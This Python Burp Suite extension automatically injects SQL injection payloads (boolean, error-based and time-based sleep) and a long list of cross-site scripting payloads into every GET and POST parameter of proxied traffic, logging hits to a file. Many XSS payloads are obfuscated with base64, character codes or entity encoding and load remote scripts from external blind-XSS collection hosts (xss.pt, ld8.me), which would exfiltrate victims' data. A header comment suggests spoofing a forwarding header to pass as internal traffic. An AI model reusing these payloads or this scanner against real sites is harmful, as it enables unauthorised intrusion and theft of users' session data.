#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2019/10/29 10:35
# @Author  : xiaodong
# @github  : https://github.com/dongfangyuxiao/
# @Site    : #
# @File    : Burp_Sql.py
# @Software: PyCharm
#思路为显注，盲注和布尔注入，如果检测到存在sql注入，调用sqlmap自动化检测
#201912.6增加header中x-for-ward字段，这样可能能够欺骗服务端，以为是内网来的请求，就放过了

from burp import IBurpExtender
from burp import IHttpListener
from burp import IHttpRequestResponse
from burp import IResponseInfo
from burp import IRequestInfo
from burp import IHttpService
from burp import IScannerCheck
from burp import IScannerInsertionPointProvider
from burp import IParameter
from burp import IScanIssue
from urlparse import urlparse
from java.net import URL
import urllib2
import sys
sys.path.append('C:/Python27/Lib/site-packages')
import subprocess
import random
import time
import threading
import re
import requests

class FuzzSQL:
    def __init__(self):


        #这个用来做paylaod执行  这个里面都是正确的，下面的都是错误的
        self.payloadRight = [
            'and 1=1',
            "and '1'='1",
            "or '1234'='1234",
            'or "x"="x',
            'and "x"="x',

        ]
        #这个都是错误的，和上面的一一对应，我要的就是一对一错
        self.payloadWrong = [
            'and 1=2',
            "and '1'='2",
            "or '1234'='1",
            'or "x"="y',
            'and "x"="y',

        ]
        #用于前面的闭合
        self.bihe=[
            '',
            "'",
            '"',
            "')",
            '")',
            ';',
            ');',
            "';",
            "'))",
            '"))'
        ]
        #这个用来注释
        self.zhushi=[
            '',
            '-- ',
            '--+',
            '#',
           # ';%00',
        ]

        self.errorFlag = re.compile(r'.*(SQL syntax.*?MySQL|Warning.*?\Wmysqli?_|MySQLSyntaxErrorException|valid MySQL result|check the manual that|MySqlClient\.|com\.mysql\.jdbc|Mysqli_Exception|MySqlException|Syntax error|PostgreSQL.*?ERROR|Npgsql\.|PG::SyntaxError:|PSQLException|Driver.*? SQL*Server|OLE DB.*? SQL Server|Warning.*?\W(mssql|sqlsrv)_|ODBC SQL Server Driver|SQLServer JDBC Driver|SQL(Srv|Server)Exception|Oracle error|SQL command|OracleException|SQL error|DB2Exception|Informix|IfxException|SQL Error|SQLite|JDBCDriver|sqlite3|SQLiteException|DriverSapDB|Sybase|SybSQLException|SQLSTATE|SQL syntax|mysql_error|syntax error|nvarchar|valid Mysql|Unknown column|ODBC SQL SERVER|An unhandled exception|sqlException|SQLException|OleDbException).*')

        self.blind=[
            #"SELECT pg_sleep(5)",
            "and sleep(5)",
            "xor sleep(5)",
            "or sleep(5)",
            "waitfor delay '0:0:5'",
            'if(now()=sysdate(),sleep(5),0)',
            'XOR(if(now()=sysdate(),sleep(5),0))',
            'OR 261=(SELECT 261 FROM PG_SLEEP(5))',
           # "(select(0)from(select(sleep(12)))v)/*'%2B(select(0)from(select(sleep(12)))v)%2B'\"%2B(select(0)from(select(sleep(12)))v)%2B\"*/",
           # '$class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5").waitFor()',#这是个模板注入，放在这里了
           # '$class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5").waitFor()',#
           # '$(sleep 5)',

        ]

        self.xssqianzhui=[
            '',
            "'",
            '"',
            '>'
            "'>",
            '">'
        ]
        self.xssPayload = [

            '<Img sRC=https://xss.pt/e5Hvp.jpg>',
            '<sCRiPt sRC=//xss.pt/e5Hv></sCrIpT>',
            '%3CsCRiPt%20sRC%3D%2F%2Fxss.pt%2Fe5Hv%3E%3C%2FsCrIpT%3E',
            '</tExtArEa>\'"><sCRiPt sRC=https://xss.pt/e5Hv></sCrIpT>',
            '%26lt%3B%2FtExtArEa%26gt%3B%26%23039%3B%26quot%3B%26gt%3B%26lt%3BsCRiPt%20sRC%3Dhttps%3A%2F%2Fxss.pt%2Fe5Hv%26gt%3B%26lt%3B%2FsCrIpT%26gt%3B',
            '%2526lt%253B%252FtExtArEa%2526gt%253B%2526%2523039%253B%2526quot%253B%2526gt%253B%2526lt%253BsCRiPt%2520sRC%253Dhttps%253A%252F%252Fxss.pt%252Fe5Hv%2526gt%253B%2526lt%253B%252FsCrIpT%2526gt%253B',
            '</tEXtArEa>\'"><img src=# id=xssyou style=display:none onerror=eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22https%3A%2F%2Fxss.pt%2Fe5Hv%22%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));//>',
            'https://xss.pt/e5Hv',
            "<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='https://xss.pt/e5Hv';>",
            "<img src=x onerror=eval(atob('cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwczovL3hzcy5wdC9lNUh2PycrTWF0aC5yYW5kb20oKQ=='))>",
            "<iframe WIDTH=0 HEIGHT=0 srcdoc=。。。。。。。。。。&#60;&#115;&#67;&#82;&#105;&#80;&#116;&#32;&#115;&#82;&#67;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#120;&#115;&#115;&#46;&#112;&#116;&#47;&#101;&#53;&#72;&#118;&#34;&#62;&#60;&#47;&#115;&#67;&#114;&#73;&#112;&#84;&#62;>",
            '%3Ciframe%20WIDTH%3D0%20HEIGHT%3D0%20srcdoc%3D%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%26%2360%3B%26%23115%3B%26%2367%3B%26%2382%3B%26%23105%3B%26%2380%3B%26%23116%3B%26%2332%3B%26%23115%3B%26%2382%3B%26%2367%3B%26%2361%3B%26%2334%3B%26%23104%3B%26%23116%3B%26%23116%3B%26%23112%3B%26%23115%3B%26%2358%3B%26%2347%3B%26%2347%3B%26%23120%3B%26%23115%3B%26%23115%3B%26%2346%3B%26%23112%3B%26%23116%3B%26%2347%3B%26%23101%3B%26%2353%3B%26%2372%3B%26%23118%3B%26%2334%3B%26%2362%3B%26%2360%3B%26%2347%3B%26%23115%3B%26%2367%3B%26%23114%3B%26%2373%3B%26%23112%3B%26%2384%3B%26%2362%3B%3E',
            '<iframe WIDTH=0 HEIGHT=0 srcdoc=。。。。。。。。。。&#x3C;&#x73;&#x43;&#x52;&#x69;&#x50;&#x74;&#x20;&#x73;&#x52;&#x43;&#x3D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x73;&#x3A;&#x2F;&#x2F;&#x78;&#x73;&#x73;&#x2E;&#x70;&#x74;&#x2F;&#x65;&#x35;&#x48;&#x76;&#x22;&#x3E;&#x3C;&#x2F;&#x73;&#x43;&#x72;&#x49;&#x70;&#x54;&#x3E;>',
            '%3Ciframe%20WIDTH%3D0%20HEIGHT%3D0%20srcdoc%3D%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%26%23x3C%3B%26%23x73%3B%26%23x43%3B%26%23x52%3B%26%23x69%3B%26%23x50%3B%26%23x74%3B%26%23x20%3B%26%23x73%3B%26%23x52%3B%26%23x43%3B%26%23x3D%3B%26%23x22%3B%26%23x68%3B%26%23x74%3B%26%23x74%3B%26%23x70%3B%26%23x73%3B%26%23x3A%3B%26%23x2F%3B%26%23x2F%3B%26%23x78%3B%26%23x73%3B%26%23x73%3B%26%23x2E%3B%26%23x70%3B%26%23x74%3B%26%23x2F%3B%26%23x65%3B%26%23x35%3B%26%23x48%3B%26%23x76%3B%26%23x22%3B%26%23x3E%3B%26%23x3C%3B%26%23x2F%3B%26%23x73%3B%26%23x43%3B%26%23x72%3B%26%23x49%3B%26%23x70%3B%26%23x54%3B%26%23x3E%3B%3E',
            '<sCRiPt/SrC=//xss.pt/e5Hv>',
            '</tExtArEa>\'"><sCRiPt sRC=//ld8.me/XGGX></sCrIpT>',
            "<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='//ld8.me/XGGX';>",
            '<sCRiPt/SrC=//ld8.me/XGGX>',
            '<Img sRC=//ld8.me/XGGX/test.jpg>'
            '<img src="" onerror="document.write(String.fromCharCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,108,100,56,46,109,101,47,88,71,71,88,62,60,47,115,67,114,73,112,84,62))">',
            "<embed src=https://ld8.me/liuyan/xs.swf?a=e&c=doc\u0075ment.write(St\u0072ing.from\u0043harCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,108,100,56,46,109,101,47,88,71,71,88,62,60,47,115,67,114,73,112,84,62)) allowscriptaccess=always type=application/x-shockwave-flash></embed>",
            '<img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vbGQ4Lm1lL1hHR1giO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>',
            '</tEXtArEa>\'"><img src=# id=xssyou style=display:none onerror=eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22https%3A%2F%2Fld8.me%2FXGGX%22%2BMath.random%28%29%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));//>',
            '<input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vbGQ4Lm1lL1hHR1giO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>'
           '<script>alert(/135790/)</script>',
            '<sc<script>ript>alert(/135790/)</script>'
           '<img src=1 onerror=alert(/135790/)>'
           '<script>alert(135790);</script>',
           '<script>prompt(135790);</script>',
           '<script>confirm(135790);</script>',
           '<scRipT>alert(135790)</ScriPt>',
           '<script src=data:text/javascript,alert(135790)></script>',
           '<script>alert(String.fromCharCode(135790,135790))</script>',
           '<script>setTimeout(alert(135790),0)</script>',
           '<script>\u0061\u006C\u0065\u0072\u0074(135790)</script>',


]
class BurpExtender(IBurpExtender,IScannerCheck):

    def registerExtenderCallbacks(self,callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._callbacks.registerScannerCheck(self)
        self._callbacks.setExtensionName("SQL_inject")
        print("for SQL inject scan")
        self.fuzzSQL = FuzzSQL()


    def doPassiveScan(self, baseRequestResponse):
        sqlTarget = []
        Request = baseRequestResponse.getRequest()
        analyzedRequest, reqHeaders, reqBodys, reqMethod, reqParameters= self.get_request_info(Request)

        Response = baseRequestResponse.getResponse()
        ResHeaders, ResBodys, ResStatusCode, resLength = self.get_response_info(Response)

        #print reqHeaders
        httpService = baseRequestResponse.getHttpService()
        host, port, protocol, ishttps, = self.get_server_info(httpService)

        host1 = ".".join(host.split('.')[1:])
        host2 = ".".join(host.split('.')[2:])
        # print targetHost
        newReqUrl = self.get_request_url(protocol, reqHeaders, host, port)
        tmpurl = newReqUrl.split('?')[0]
        #
        if (1==1):
            for parameter in reqParameters:
                parameterName, parameterValue, parameterType = self.get_parameter_Name_Value_Type(parameter)
                if parameterType ==0 or parameterType ==1 :#只检测get和post方法里面的参数，cookie里面的不检测

                    t2 = threading.Thread(target=self.sqlBool, args=(
                        Request, protocol, host, port, ishttps, parameterName, parameterValue, parameterType,ResStatusCode, resLength))
                    sqlTarget.append(t2)


                    t3 = threading.Thread(target=self.sqlBlind, args=(
                        Request, protocol, host, port, ishttps, parameterName, parameterValue, parameterType))

                    sqlTarget.append(t3)

                    t4 = threading.Thread(target=self.xssTest, args=(
                        Request, protocol, host, port, ishttps, parameterName, parameterValue, parameterType))
                    sqlTarget.append(t4)



        for x in sqlTarget:
            x.start()
        for x in sqlTarget:
            x.join()

    def consolidateDuplicateIssues(self, existingIssue, newIssue):

        return 0

    def doActiveScan(self, baseRequestResponse, insertionPoint):
            # report the issue
            return None


    def sqlBlind(self, request, protocol, host, port, ishttps, parameterName, parameterValue, parameterType):

        for payload in self.fuzzSQL.blind:
            for bihe in self.fuzzSQL.bihe:
                for zhushi in self.fuzzSQL.zhushi:
                    randomTime = random.randint(5,10)

                    paraNewValue = parameterValue + urllib2.quote(bihe + ' ' + payload.replace("5",str(randomTime)) + ' ' + zhushi)
                    newParameter = self._helpers.buildParameter(parameterName, paraNewValue, parameterType)
                    newRequest = self._helpers.updateParameter(request, newParameter)
                    startTime = time.time()
                    # print(newRequest)
                    newResponse = self._callbacks.makeHttpRequest(host, port, ishttps, newRequest)
                    newAnalyzedRequest, newReqHeaders, newReqBodys, newReqMethod, newReqParameters = self.get_request_info(
                        newRequest)
                    newReqUrl = self.get_request_url(protocol, newReqHeaders, host,port)
                    #
                    newResHeaders, newResBodys, newResStatusCode, resLength = self.get_response_info(newResponse)
                    endTime = time.time()
                    sleepTime = endTime - startTime

                    if abs(sleepTime-randomTime)<2<randomTime < sleepTime:
                        startTime2 = time.time()
                        newResponse2 = self._callbacks.makeHttpRequest(host, port, ishttps, newRequest)
                        endtime2 = time.time()
                        sleepTime2 = endtime2 - startTime2
                        if abs(sleepTime2 - sleepTime)<2< randomTime < sleepTime2:
                            print randomTime
                            print sleepTime
                            print sleepTime2
                            content = '[+]{} {} {} -> {}\n{}\n[Bodys] -> {}'.format('[Blind SQL GET]', randomTime,sleepTime,
                                                                                 newReqUrl, newReqHeaders, newReqBodys)
                            print ('[+]{} {} {} -> {}'.format('[Blind SQL GET]', randomTime,sleepTime, newReqUrl))
                            self.save(content + '\t\n')
                            print ('-' * 50)
                            return


    def re_request(self,reqHeaders2,newReqBodys2, newReqMethod2,newReqUrl):
        heaers = {
        }
        newHeaders = reqHeaders2[2:]

        for header in newHeaders:
            heaers[header.split(':')[0]] = ":".join(header.split(':')[1:]).replace(" ", "")
        try:
            if newReqMethod2 == 'GET':
                res = requests.get(newReqUrl,headers = heaers,timeout=30)
            else:
                res = requests.request(newReqMethod2,newReqUrl,data=newReqBodys2,headers = heaers,timeout=10)
            statusCode = res.status_code
            lenGth = len(res.content)
        except Exception as e:
            #print e
            statusCode = '0'
            lenGth = int(0)
            pass

        return statusCode,lenGth

    def sqlBool(self, request, protocol, host, port, ishttps, parameterName, parameterValue, parameterType,ResStatusCode, resLength):
        blackstatus = ['456','999','400','302','502','403']
        for bihe in self.fuzzSQL.bihe:
            for zhushi in self.fuzzSQL.zhushi:
                for x in range(0,len(self.fuzzSQL.payloadRight)):
                    paraNewValue1 = parameterValue+urllib2.quote(bihe+' '+self.fuzzSQL.payloadRight[x]+' '+zhushi)
                    paraNewValue2 = parameterValue+urllib2.quote(bihe+' '+self.fuzzSQL.payloadWrong[x]+' '+zhushi)
            #print paraNewValue
                    newParameter1 = self._helpers.buildParameter(parameterName, paraNewValue1, parameterType)
                    newRequest1 = self._helpers.updateParameter(request, newParameter1)

                    newParameter2 = self._helpers.buildParameter(parameterName, paraNewValue2, parameterType)
                    newRequest2 = self._helpers.updateParameter(request, newParameter2)

            #print(newRequest)
                    newResponse1 = self._callbacks.makeHttpRequest(host, port, ishttps, newRequest1)
                    newResponse2 = self._callbacks.makeHttpRequest(host, port, ishttps, newRequest2)

                    newAnalyzedRequest1, newReqHeaders1, newReqBodys1, newReqMethod1, newReqParameters1 = self.get_request_info(
                    newRequest1)

                    newAnalyzedRequest2, newReqHeaders2, newReqBodys2, newReqMethod2, newReqParameters2 = self.get_request_info(
                        newRequest2)

                    newResHeaders1, newResBodys1, newResStatusCode1,resLength1= self.get_response_info(newResponse1)
                    newResHeaders2, newResBodys2, newResStatusCode2, resLength2 = self.get_response_info(newResponse2)

                    #print newResStatusCode2
                    #print blackstatus

                    #abs(resLength1-resLength)/resLength<0.05 and 0.01<abs(resLength2-resLength)/resLength<0.1
                    flag1 = (newResStatusCode1 ==ResStatusCode)
                    flag2 = newResStatusCode2 !=ResStatusCode
                    flag3 = newResStatusCode2 not in blackstatus
                    flag4 = resLength2>0


                    len1 = float(abs(resLength1-resLength))/resLength
                    len2 = float(abs(resLength2-resLength))/resLength
                    #or (len1<0.01 and 0.01<len2<0.1)
                    if resLength2>0 and ((flag1 and flag2 and flag3 and ResStatusCode=='200') or (len1<0.01<len2<0.1)) :
                        newReqUrl = self.get_request_url(protocol, newReqHeaders1, host,port)
                        #print newReqBodys2

                        #reStatus,reLength = self.re_request(newReqHeaders2,newReqBodys2, newReqMethod2,newReqUrl)
                        print ResStatusCode, newResStatusCode1, newResStatusCode2
                        print resLength, resLength1, resLength2
                        print len1 #两个正确的值相差不会超过百分之1
                        print len2  #超过百分之10说明有重定向或者统一的waf或404页面

                        #print newReqUrl
                        #if (reStatus!=ResStatusCode or abs(reLength-resLength)>50):#再次判断是否准确，现在看来没必要，就这样
                            #print ResStatusCode,newResStatusCode1,newResStatusCode2,reStatus
                            #print resLength,resLength1,resLength2,reLength
                        content = '[+] Bool SQL Get  ->{} {}\n {}\n {}'.format('[Bool]',newReqUrl,newReqHeaders2,newReqBodys2)
                        print ('[+]{}  -> {}'.format('[Bool SQL GET]',newReqUrl))
                        self.save(content + '\t\n')
                        print ('-' * 50)
                        return

                    errorInject = self.fuzzSQL.errorFlag.findall(newResBodys1)

                    if errorInject:
                        newReqUrl = self.get_request_url(protocol, newReqHeaders1,host,port)
                        content = '[+] Error SQL Get {} ->{} {}\n{}\n[Bodys] -> {}'.format('[Error]', errorInject,
                                                                                                newReqUrl,
                                                                                                newReqHeaders1,
                                                                                                newReqBodys1)
                        print ('[+] Error SQL Get {} ->{} {}\n'.format('[Error]', errorInject,newReqUrl))
                        self.save(content + '\t\n')
                        print ('-' * 50)
                        return









    def xssTest(self, request, protocol, host, port, ishttps, parameterName, parameterValue, parameterType):
        resLengths = []
        newResStatusCodes = []
        for qianzhui in self.fuzzSQL.xssqianzhui:
            for paraNewValue in self.fuzzSQL.xssPayload:

                paraNewValue = parameterValue+urllib2.quote(qianzhui+paraNewValue)
            #print paraNewValue
                newParameter = self._helpers.buildParameter(parameterName, paraNewValue, parameterType)
                newRequest = self._helpers.updateParameter(request, newParameter)
            #print(newRequest)
                newResponse = self._callbacks.makeHttpRequest(host, port, ishttps, newRequest)
                newAnalyzedRequest, newReqHeaders, newReqBodys, newReqMethod, newReqParameters = self.get_request_info(
                newRequest)
                #analyzedRequest, reqHeaders, reqBodys, reqMethod, reqParameters = self.get_request_info(newRequest)

                newResHeaders, newResBodys, newResStatusCode,resLength= self.get_response_info(newResponse)

                if 'XGGX'  in newResBodys or 'e5Hvp' in newResBodys or '135790' in newResBodys:
                    newReqUrl = self.get_request_url(protocol, newReqHeaders,host,port)
                    content = '[+] XSS Get {} ->\n[Headers] -> {}\n[Bodys] -> {}'.format(newReqUrl,newReqHeaders,newReqBodys)
                    print (content)
                    self.save(content + '\t\n')
                    print ('-' * 50)
                    return






    def get_response_info(self, response):
        analyzedResponse = self._helpers.analyzeResponse(
            response)
        resHeaders = analyzedResponse.getHeaders()
        resBodys = response[
                   analyzedResponse.getBodyOffset():].tostring()
        resStatusCode = str(analyzedResponse.getStatusCode())
        resLength = len(resBodys)
        return resHeaders, resBodys, resStatusCode, resLength


    def get_server_info(self, httpService):
        host = httpService.getHost()
        port = httpService.getPort()
        protocol = httpService.getProtocol()
        ishttps = False
        if protocol == 'https':
            ishttps = True
        return host, port, protocol, ishttps


    def get_parameter_Name_Value_Type(self, parameter):
        parameterName = parameter.getName()
        parameterValue = parameter.getValue()
        parameterType = parameter.getType()
        return parameterName, parameterValue, parameterType

        # 获取请求的url

    def get_request_url(self, protocol, reqHeaders, host, port):
        link = reqHeaders[0].split(' ')[1]
        # host = reqHeaders[1].split(' ')
        if link.startswith('http'):
            return link

        else:
            return protocol + '://' + host + ":" + str(port) + link


    def save(self, content):
        #print(content)
        f = open('burp_sql.txt', 'at')
        f.writelines(content + '\n\n')
        f.close()



    def get_request_info(self, request):
        analyzedRequest = self._helpers.analyzeRequest(
            request)
        reqHeaders = analyzedRequest.getHeaders()
        reqBodys = request[analyzedRequest.getBodyOffset():].tostring()
        reqMethod = analyzedRequest.getMethod()
        reqParameters = analyzedRequest.getParameters()
        return analyzedRequest, reqHeaders, reqBodys, reqMethod, reqParameters


